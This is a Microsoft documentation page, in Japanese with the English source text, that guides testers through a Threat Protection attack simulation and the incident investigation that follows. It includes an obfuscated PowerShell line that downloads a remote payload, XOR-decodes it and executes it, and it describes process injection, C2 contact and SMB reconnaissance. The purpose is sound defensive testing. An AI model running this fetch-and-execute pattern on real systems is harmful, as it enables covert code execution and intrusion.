---
title: Microsoft の脅威保護攻撃のシミュレーションを実行する
description: Microsoft の脅威保護パイロットプロジェクトに対して攻撃のシミュレーションを実行して、が展開と迅速な対処方法を確認します。
keywords: Microsoft Threat Protection パイロット攻撃シミュレーション、Microsoft Threat protection パイロット攻撃シミュレーション、microsoft の脅威保護、Microsoft Threat Protection パイロットプロジェクト、サイバーセキュリティ、高度な脅威、エンタープライズセキュリティ、デバイス、デバイス、id、ユーザー、データ、アプリケーション、インシデント、自動化された調査と修復、高度な検索
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection: M365-security-compliance
ms.topic: conceptual
ms.openlocfilehash: f7d00575a0a5757f0662c07e727d7166d571e2ca
ms.sourcegitcommit: c083602dda3cdcb5b58cb8aa070d77019075f765
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 09/22/2020
ms.locfileid: "48201197"
---
# <a name="run-your-microsoft-threat-protection-attack-simulations"></a><span data-ttu-id="7f058-104">Microsoft の脅威保護攻撃のシミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="7f058-104">Run your Microsoft Threat Protection attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


<span data-ttu-id="7f058-105">**適用対象:**</span><span class="sxs-lookup"><span data-stu-id="7f058-105">**Applies to:**</span></span>
- <span data-ttu-id="7f058-106">Microsoft Threat Protection</span><span class="sxs-lookup"><span data-stu-id="7f058-106">Microsoft Threat Protection</span></span>

<span data-ttu-id="7f058-107">パイロット環境を準備した後は、Microsoft の脅威保護インシデントの管理および自動調査と修復の機能をテストする時間です。</span><span class="sxs-lookup"><span data-stu-id="7f058-107">After preparing your pilot environment, it’s time to test the Microsoft Threat Protection incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="7f058-108">高度な技術を活用して、検出から隠すことができるように、高度な攻撃をシミュレートするのに役立ちます。</span><span class="sxs-lookup"><span data-stu-id="7f058-108">We will help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="7f058-109">この攻撃は、ドメインコントローラーで開かれているサーバーメッセージブロック (SMB) セッションを列挙し、ユーザーのデバイスの最近の IP アドレスを取得します。</span><span class="sxs-lookup"><span data-stu-id="7f058-109">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="7f058-110">通常、このカテゴリの攻撃には、犠牲者のデバイスで削除されたファイルは含まれません。メモリ内でのみ発生します。</span><span class="sxs-lookup"><span data-stu-id="7f058-110">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="7f058-111">既存のシステムおよび管理ツールを使用して "地上からの生放送" を行い、そのコードをシステムプロセスに挿入して実行を非表示にし、それらのコードを回避検出してデバイス上で保持できるようにします。</span><span class="sxs-lookup"><span data-stu-id="7f058-111">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.</span></span>

<span data-ttu-id="7f058-112">このシミュレーションでは、サンプルシナリオは PowerShell スクリプトで始まります。</span><span class="sxs-lookup"><span data-stu-id="7f058-112">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="7f058-113">ユーザーがスクリプトを実行するように設定されている可能性があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-113">A user might be tricked into running a script.</span></span> <span data-ttu-id="7f058-114">または、このスクリプトは、以前に感染したデバイスからの別のコンピューターへのリモート接続から実行される可能性があります。これは、攻撃者がネットワーク内で laterally を移動しようとしています。</span><span class="sxs-lookup"><span data-stu-id="7f058-114">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="7f058-115">さまざまな管理作業を実行するために、管理者がスクリプトをリモートで実行することもよくあるため、これらのスクリプトを検出するのは困難な場合があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-115">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Fileless PowerShell アタックとプロセスインジェクションおよび SMB reconnaisance 攻撃図](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="7f058-117">シミュレーションの間、攻撃はシェルコードを一見無害なプロセスに挿入します。</span><span class="sxs-lookup"><span data-stu-id="7f058-117">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="7f058-118">このシナリオでは、notepad.exe を使用します。</span><span class="sxs-lookup"><span data-stu-id="7f058-118">In this scenario, we’ll use notepad.exe.</span></span> <span data-ttu-id="7f058-119">シミュレーションではこのプロセスを選択しましたが、攻撃者は svchost.exe などの長時間実行されているシステムプロセスを対象としている可能性が高くなります。</span><span class="sxs-lookup"><span data-stu-id="7f058-119">We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="7f058-120">次に、シェルコードによって、攻撃者のコマンドとコントロール (C2) サーバーとの間の連絡を受け、処理を進める手順を受信します。</span><span class="sxs-lookup"><span data-stu-id="7f058-120">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="7f058-121">また、スクリプトは、ドメインコントローラー (DC) に対して偵察クエリの実行を試行します。</span><span class="sxs-lookup"><span data-stu-id="7f058-121">In addition, the script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="7f058-122">これにより、攻撃者は最近のユーザーログイン情報に関する情報を取得できます。</span><span class="sxs-lookup"><span data-stu-id="7f058-122">This allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="7f058-123">攻撃者は、この情報を入手すると、ネットワーク内の laterally を移動して特定の機密アカウントにアクセスできるようになります。</span><span class="sxs-lookup"><span data-stu-id="7f058-123">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="7f058-124">最適な結果を得るには、攻撃のシミュレーション手順に従ってください。</span><span class="sxs-lookup"><span data-stu-id="7f058-124">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="7f058-125">シミュレーション環境の要件</span><span class="sxs-lookup"><span data-stu-id="7f058-125">Simulation environment requirements</span></span>

<span data-ttu-id="7f058-126">準備段階で既にパイロット環境を構成してあるので、このシナリオでは、テストデバイスとドメインコントローラーという2つのデバイスがあることを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-126">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="7f058-127">テナントに [保護](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)があることを確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-127">Verify your tenant has [Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼.</span></span>
2.  <span data-ttu-id="7f058-128">テストドメインコントローラーの構成を確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-128">Verify your test domain controller configuration:</span></span>
    - <span data-ttu-id="7f058-129">デバイスは Windows Server 2008 R2 以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-129">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="7f058-130">テストドメインコントローラーを [Azure Advanced Threat Protection に設定](https://docs.microsoft.com/azure/security-center/security-center-wdatp) し、 [リモート管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)を有効にします。</span><span class="sxs-lookup"><span data-stu-id="7f058-130">The test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="7f058-131">[AZURE ATP と Microsoft Cloud App Security 統合](https://docs.microsoft.com/cloud-app-security/aatp-integration)が有効になっていることを確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-131">Verify that [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="7f058-132">ドメインにテストユーザーが作成されます。管理者のアクセス許可は必要ありません。</span><span class="sxs-lookup"><span data-stu-id="7f058-132">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="7f058-133">テストデバイスの構成を確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-133">Verify test device configuration:</span></span>
    <br>
    <span data-ttu-id="7f058-134">a.</span><span class="sxs-lookup"><span data-stu-id="7f058-134">a.</span></span>  <span data-ttu-id="7f058-135">デバイスは Windows 10 バージョン1903またはそれ以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-135">Device runs with Windows 10 version 1903 or a later version.</span></span>
    <br>
    <span data-ttu-id="7f058-136">b.</span><span class="sxs-lookup"><span data-stu-id="7f058-136">b.</span></span>  <span data-ttu-id="7f058-137">テストデバイスはテストドメインに参加しています。</span><span class="sxs-lookup"><span data-stu-id="7f058-137">Test device is joined to the test domain.</span></span>
    <br>
    <span data-ttu-id="7f058-138">c. </span><span class="sxs-lookup"><span data-stu-id="7f058-138">c.</span></span>  <span data-ttu-id="7f058-139">[Windows Defender ウイルス対策を有効](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)にします。</span><span class="sxs-lookup"><span data-stu-id="7f058-139">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7f058-140">Windows Defender ウイルス対策を有効にする際に問題が発生した場合は、この [トラブルシューティングのトピック](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-140">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <br>
    <span data-ttu-id="7f058-141">d. </span><span class="sxs-lookup"><span data-stu-id="7f058-141">d.</span></span>  <span data-ttu-id="7f058-142">テストデバイスが [Microsoft Defender Advanced Threat Protection (MDATP) に利用](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)していることを確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-142">Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="7f058-143">既存のテナントを使用し、デバイスグループを実装する場合は、テストデバイス用の専用デバイスグループを作成し、構成 UX の最上位レベルにプッシュします。</span><span class="sxs-lookup"><span data-stu-id="7f058-143">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="7f058-144">シミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="7f058-144">Run the simulation</span></span>

<span data-ttu-id="7f058-145">Attack scenario シミュレーションを実行するには、次の手順を実行します。</span><span class="sxs-lookup"><span data-stu-id="7f058-145">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="7f058-146">テストユーザーアカウントを使用して、テストデバイスにログインします。</span><span class="sxs-lookup"><span data-stu-id="7f058-146">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="7f058-147">テストデバイスで Windows PowerShell ウィンドウを開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-147">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="7f058-148">次のシミュレーションスクリプトをコピーします。</span><span class="sxs-lookup"><span data-stu-id="7f058-148">Copy the following simulation script:</span></span>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
><span data-ttu-id="7f058-149">このドキュメントを web ブラウザーで開くと、特定の文字を失わずに完全なテキストをコピーしたり、改行を加えることができない問題が発生することがあります。</span><span class="sxs-lookup"><span data-stu-id="7f058-149">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="7f058-150">このドキュメントをダウンロードし、Adobe Reader で開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-150">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="7f058-151">プロンプトで、貼り付けてコピーしたスクリプトを実行します。</span><span class="sxs-lookup"><span data-stu-id="7f058-151">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="7f058-152">リモートデスクトッププロトコル (RDP) を使用して PowerShell を実行している場合は、 **CTRL キーを押しながら** ホットキーまたは右クリックによる貼り付けの方法が機能しない可能性があるため、rdp クライアントの [クリップボードテキストの入力] コマンドを使用します。</span><span class="sxs-lookup"><span data-stu-id="7f058-152">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="7f058-153">最近使用したバージョンの PowerShell では、このメソッドが受け入れられない場合があります。メモ帳をメモリに最初にコピーして、仮想マシンにコピーしてから、PowerShell に貼り付ける必要があるかもしれません。</span><span class="sxs-lookup"><span data-stu-id="7f058-153">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="7f058-154">数秒後に、 <i>notepad.exe</i> が開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-154">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="7f058-155">シミュレートされた攻撃コードが notepad.exe に組み込まれます。</span><span class="sxs-lookup"><span data-stu-id="7f058-155">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="7f058-156">自動的に生成されたメモ帳インスタンスを開いたままにしておくと、完全なシナリオが発生します。</span><span class="sxs-lookup"><span data-stu-id="7f058-156">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="7f058-157">シミュレートされた攻撃コードは、外部 IP アドレス (C2 サーバーをシミュレートしたもの) と通信し、SMB を介してドメインコントローラーに対して偵察を試行します。</span><span class="sxs-lookup"><span data-stu-id="7f058-157">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="7f058-158">このスクリプトが完了すると、PowerShell コンソールにメッセージが表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-158">You will see a message displayed on the PowerShell console when this script completes.</span></span>

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="7f058-159">自動インシデントアンドレスポンス機能を確認するには、notepad.exe プロセスを開いたままにします。</span><span class="sxs-lookup"><span data-stu-id="7f058-159">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="7f058-160">[自動インシデントと応答] が表示され、メモ帳のプロセスを停止します。</span><span class="sxs-lookup"><span data-stu-id="7f058-160">You will see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="7f058-161">インシデントの調査</span><span class="sxs-lookup"><span data-stu-id="7f058-161">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="7f058-162">このシミュレーションを開始する前に、次のビデオを参照して、調査プロセスの一環として、インシデント管理が関連アラートをどのように支援するかを確認し、ポータルでその情報を見つけられるようにして、セキュリティの操作にどのように役立てることができるかを見ていきましょう。</span><span class="sxs-lookup"><span data-stu-id="7f058-162">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="7f058-163">SOC アナリストの視点に切り替えると、Microsoft 365 セキュリティセンターポータルで攻撃の調査を開始できるようになります。</span><span class="sxs-lookup"><span data-stu-id="7f058-163">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="7f058-164">[Microsoft 365 セキュリティセンターポータル](https://security.microsoft.com/incidents)のインシデントのキューを任意のデバイスから開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-164">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="7f058-165">メニューから [ **インシデント** ] に移動します。</span><span class="sxs-lookup"><span data-stu-id="7f058-165">Navigate to **Incidents** from the menu.</span></span> 

    ![Microsoft 365 セキュリティセンターの左側のメニューに表示されるインシデントのスクリーンショット](../../media/mtp/fig1.png)

3.  <span data-ttu-id="7f058-167">シミュレートされた攻撃の新しいインシデントは、インシデントキューに表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-167">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![インシデントキューのスクリーンショット](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="7f058-169">1つのインシデントとしての攻撃を調査する</span><span class="sxs-lookup"><span data-stu-id="7f058-169">Investigate the attack as a single incident</span></span>

<span data-ttu-id="7f058-170">Microsoft の脅威保護は、分析を相互に関連付けて、さまざまな製品からのすべての通知と調査を1つのインシデントエンティティに集約します。</span><span class="sxs-lookup"><span data-stu-id="7f058-170">Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="7f058-171">これにより、Microsoft の脅威保護によって、広範な攻撃ストーリーが表示されます。これにより、SOC アナリストは複雑な脅威について理解し、対応することができます。</span><span class="sxs-lookup"><span data-stu-id="7f058-171">By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="7f058-172">このシミュレーション中に生成されたアラートは同じ脅威に関連付けられているため、1つのインシデントとして自動的に集約されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-172">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="7f058-173">インシデントを表示するには:</span><span class="sxs-lookup"><span data-stu-id="7f058-173">To view the incident:</span></span>

1.  <span data-ttu-id="7f058-174">[ **インシデント** キューに移動します。</span><span class="sxs-lookup"><span data-stu-id="7f058-174">Navigate to the **Incidents** queue.</span></span>
 
    ![ナビゲーションメニューの [インシデント] のスクリーンショット](../../media/mtp/fig1.png)

2.  <span data-ttu-id="7f058-176">インシデント名の左にある円をクリックして、最新のアイテムを選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-176">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="7f058-177">サイドパネルには、関連するすべての通知を含む、インシデントに関する追加情報が表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-177">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="7f058-178">各インシデントには、それに含まれる通知の属性に基づいて、それぞれについて説明する一意の名前が付いています。</span><span class="sxs-lookup"><span data-stu-id="7f058-178">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![シミュレーション中に生成されたアラートが集約されるインシデントページのスクリーンショット](../../media/mtp/fig4.png)

    <span data-ttu-id="7f058-180">ダッシュボードに表示される通知は、サービスリソースに基づいてフィルターできます。 Azure ATP、Microsoft Cloud App Security、Microsoft Defender ATP、Microsoft Threat Protection、および Office ATP。</span><span class="sxs-lookup"><span data-stu-id="7f058-180">The alerts that shows in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.</span></span>  

3.  <span data-ttu-id="7f058-181">[ **インシデントを開く] ページ** を選択して、インシデントに関する詳細情報を取得します。</span><span class="sxs-lookup"><span data-stu-id="7f058-181">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="7f058-182">[ **インシデント** ] ページには、インシデントに関連するすべてのアラートと情報が表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-182">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="7f058-183">これには、アラートに関連するエンティティとアセット、アラートの検出ソース (Azure ATP、EDR)、およびそれらがリンクされた理由が含まれます。</span><span class="sxs-lookup"><span data-stu-id="7f058-183">This includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="7f058-184">[インシデント] アラートリストの確認は、攻撃の進行状況を示します。</span><span class="sxs-lookup"><span data-stu-id="7f058-184">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="7f058-185">このビューでは、個々の通知を確認して調べることができます。</span><span class="sxs-lookup"><span data-stu-id="7f058-185">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="7f058-186">また、右側のメニューから [ **インシデントの管理** ] をクリックして、インシデントをタグ付けし、自分に割り当て、コメントを追加することもできます。</span><span class="sxs-lookup"><span data-stu-id="7f058-186">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![[インシデントの管理] をクリックする場所のスクリーンショット](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="7f058-188">インシデントをタグ付けし、自分自身に割り当て、コメントを追加できる、[インシデントの管理] パネルのフィールドのスクリーンショット</span><span class="sxs-lookup"><span data-stu-id="7f058-188">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="7f058-189">生成された通知を確認する</span><span class="sxs-lookup"><span data-stu-id="7f058-189">Review generated alerts</span></span> 

<span data-ttu-id="7f058-190">シミュレートされた攻撃で生成されるアラートのいくつかを見てみましょう。</span><span class="sxs-lookup"><span data-stu-id="7f058-190">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="7f058-191">ここでは、シミュレートされた攻撃の際に生成される警告のうちのいくつかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-191">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="7f058-192">テストデバイス上で実行されている Windows のバージョンと Microsoft の脅威保護製品によっては、順序が若干異なるアラートが表示されることがあります。</span><span class="sxs-lookup"><span data-stu-id="7f058-192">Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![生成されたアラートのスクリーンショット](../../media/mtp/fig6.png) 


<span data-ttu-id="7f058-194">**通知: 不審なプロセスの挿入が監視 (ソース: Microsoft Defender ATP EDR)**</span><span class="sxs-lookup"><span data-stu-id="7f058-194">**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="7f058-195">高度な攻撃者は、高度で stealthy のメソッドを使用して、メモリ内に保持し、検出ツールから非表示にします。</span><span class="sxs-lookup"><span data-stu-id="7f058-195">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="7f058-196">一般的な方法の1つは、悪意のある実行可能ファイルではなく、信頼されたシステムプロセス内から操作することです。これにより、検出ツールおよびセキュリティ操作が悪意のあるコードを特定するのを困難にします。</span><span class="sxs-lookup"><span data-stu-id="7f058-196">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="7f058-197">SOC アナリストがこれらの高度な攻撃を検出できるようにするために、Microsoft Defender ATP の詳細なメモリセンサーは、クラウドサービスにさまざまなプロセス間のコード注入技術を従来にわたって見やすいものにします。</span><span class="sxs-lookup"><span data-stu-id="7f058-197">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="7f058-198">次の図は、 <i>notepad.exe</i>にコードを挿入しようとしたときに MICROSOFT Defender ATP が検出され、警告が表示されることを示しています。</span><span class="sxs-lookup"><span data-stu-id="7f058-198">The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![悪意のある可能性のあるコードの挿入に関する警告のスクリーンショット](../../media/mtp/fig7.png) 


<span data-ttu-id="7f058-200">**警告: コマンドライン引数を指定せずにプロセスを実行すると、予期しない動作が監視されます (Source: Microsoft Defender ATP EDR)**</span><span class="sxs-lookup"><span data-stu-id="7f058-200">**Alert: Unexpected behavior observed by a process run with no command line arguments (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="7f058-201">Microsoft Defender ATP の検出は、多くの場合、攻撃手法の最も一般的な属性を対象としています。</span><span class="sxs-lookup"><span data-stu-id="7f058-201">Microsoft Defender ATP detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="7f058-202">これにより、耐久性が確保され、攻撃者が新しい戦術に切り替えるための水準が上がります。</span><span class="sxs-lookup"><span data-stu-id="7f058-202">This ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="7f058-203">大規模な学習アルゴリズムを使用して、組織内および世界中の共通プロセスの通常の動作を確立し、これらのプロセスが異常な動作を示す状況を監視します。</span><span class="sxs-lookup"><span data-stu-id="7f058-203">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes exhibit anomalous behaviors.</span></span> <span data-ttu-id="7f058-204">このような異常動作は、多くの場合、余分なコードが導入され、それ以外の信頼できるプロセスで実行されていることを示します。</span><span class="sxs-lookup"><span data-stu-id="7f058-204">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="7f058-205">このシナリオでは、プロセス <i>notepad.exe</i> は、外部の場所との通信を含む異常な動作を示しています。</span><span class="sxs-lookup"><span data-stu-id="7f058-205">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="7f058-206">この結果は、悪意のあるコードを導入して実行するために使用された特定の方法から独立しています。</span><span class="sxs-lookup"><span data-stu-id="7f058-206">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
><span data-ttu-id="7f058-207">このアラートは、追加のバックエンド処理を必要とする machine learning モデルに基づいているため、ポータルでこの通知が表示されるまでには時間がかかる場合があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-207">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="7f058-208">アラートの詳細には、外部 IP アドレスが含まれていることに注意してください。これは、ピボットとして使用して、調査を拡張するための指標です。</span><span class="sxs-lookup"><span data-stu-id="7f058-208">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="7f058-209">通知プロセスツリーで IP アドレスをクリックして、[IP アドレスの詳細] ページを表示します。</span><span class="sxs-lookup"><span data-stu-id="7f058-209">Click the IP address in the alert process tree to view the IP address details page.</span></span>

![コマンドライン引数を指定せずにプロセスを実行して、予期しない動作が発生した場合の警告のスクリーンショット](../../media/mtp/fig8.png) 

<span data-ttu-id="7f058-211">次の図は、[選択された IP アドレスの詳細] ページ ([アラート処理] ツリーの [IP アドレス] をクリック) を示しています。</span><span class="sxs-lookup"><span data-stu-id="7f058-211">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="7f058-212">![IP アドレスの詳細ページのスクリーンショット](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="7f058-212">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="7f058-213">**通知: ユーザーおよび IP アドレス偵察 (SMB) (ソース: Azure ATP)**</span><span class="sxs-lookup"><span data-stu-id="7f058-213">**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**</span></span>

<span data-ttu-id="7f058-214">列挙サーバーメッセージブロック (SMB) プロトコルを使用して、laterally がネットワークを介して特定の機密性の高いアカウントにアクセスするのに役立つ、最新のユーザーログオン情報を取得することを攻撃者に許可します。</span><span class="sxs-lookup"><span data-stu-id="7f058-214">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="7f058-215">この検出では、SMB セッション列挙がドメインコントローラーに対して実行されたときにアラートがトリガーされます。</span><span class="sxs-lookup"><span data-stu-id="7f058-215">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![ユーザーおよび IP アドレスの偵察に関する Azure ATP 通知のスクリーンショット](../../media/mtp/fig10.png) 


